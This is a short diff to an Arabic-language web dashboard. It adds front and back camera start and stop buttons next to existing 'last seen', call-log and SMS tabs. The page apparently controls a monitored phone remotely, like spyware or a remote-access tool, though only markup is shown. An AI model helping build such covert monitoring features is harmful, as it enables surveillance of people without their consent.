@@ -30,6 +30,13 @@
             <div class="status-item"><span class="label">آخر اتصال:</span><span id="lastSeen" class="value">—</span></div>
         </div>
         
+        <!-- ✅ قسم الكاميرا -->
+        <div class="camera-controls">
+            <button onclick="startCamera('front')" class="camera-btn">📸 كاميرا أمامية</button>
+            <button onclick="startCamera('back')" class="camera-btn">📸 كاميرا خلفية</button>
+            <button onclick="stopCamera()" class="camera-btn stop">⏹️ إيقاف</button>
+        </div>
+        
         <div class="tabs">
             <button class="tab active" onclick="switchTab('calls')">📞 المكالمات <span id="callCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('sms')">💬 الرسائل <span id="smsCount" class="count"></span></button>
